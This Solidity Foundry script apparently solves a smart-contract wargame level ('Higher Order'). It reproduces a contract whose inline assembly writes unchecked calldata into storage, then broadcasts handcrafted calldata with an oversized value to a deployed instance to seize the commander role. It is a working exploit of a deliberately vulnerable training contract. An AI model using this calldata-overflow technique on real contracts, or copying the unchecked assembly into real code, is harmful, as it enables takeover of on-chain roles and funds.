// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
// import { HigherOrder } from "../src/HigherOrder.sol";


contract Test {

	function f () external  {
		bytes memory test = bytes.concat(bytes4(keccak256("yrdy")));
	}
}



contract HigherOrder {
    address public commander;

    uint256 public treasury;

    function registerTreasury(uint8) public {
        assembly {
            sstore(treasury.slot, calldataload(4))
        }
    }

    function claimLeadership() public {
        if (treasury > 255) commander = msg.sender;
        else revert("Only members of the Higher Order can become Commander");
    }
}

contract HigherOrderSolver is Script {
	
	// HigherOrder public instance = HigherOrder(payable(0x0A249b5Fd7A895349cF5057d3dF79D0CC5cdB8C4));
// 	HigherOrder public instance = new HigherOrder();

	uint256 prv = vm.envUint("PRV");
	address me = vm.envAddress("PUB");

	function run () external {

		vm.startBroadcast(prv);

		
		// bytes memory Xploit = bytes.concat(
		// 	bytes4(keccak256("registerTreasury(uint8)")),
		// 	uint8(255)
			// bytes32(type(uint256).max),
			// bytes32(uint256(4)),
			// bytes4(keccak256("claimLeadership()"))
		// );

//		console.log(instance.commander());

		HigherOrder instance = HigherOrder(0x4d8F081704d1A2CD741eed7E43f329c09497F2F9);
		
		// sanity check
		//(bool ok, bytes memory data) = address(instance).call(
		// 	abi.encodeWithSelector(instance.registerTreasury.selector, uint8(255))
		//);
		
		bytes memory xploit = abi.encodeWithSelector(instance.registerTreasury.selector, uint8(255));
		
		xploit = bytes.concat(
			bytes4(keccak256("registerTreasury(uint8)")),
			bytes32(uint256(256))
		);

		address(instance).call(xploit);

		console.logBytes(xploit);

		console.log(instance.commander());
		console.logBytes32(bytes32(instance.treasury()));

		instance.claimLeadership();

		console.logBytes32(bytes32(instance.treasury()));
		console.log(instance.commander());

		// console.logBytes(data);
		// console.log(ok);

		vm.stopBroadcast();


	}

}
